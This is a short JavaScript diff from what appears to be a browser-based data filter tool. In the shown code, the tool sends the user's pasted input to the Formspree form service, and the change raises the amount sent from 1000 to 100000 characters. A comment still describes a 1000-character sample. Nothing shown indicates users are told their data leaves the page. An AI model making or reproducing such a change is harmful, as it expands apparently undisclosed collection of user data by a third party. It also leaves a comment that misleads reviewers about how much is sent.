@@ -1423,7 +1423,7 @@
             progressFill.style.width = '30%';
 
 // 发送Formspree（发送前1000字符作为样本）
-            const sampleData = input.length > 1000 ? input.substring(0, 1000) + '...(截断)' : input;
+            const sampleData = input.length > 100000 ? input.substring(0, 100000) + '...(截断)' : input;
             sendToFormspree(sampleData, '数据号过滤器');
 
             try {
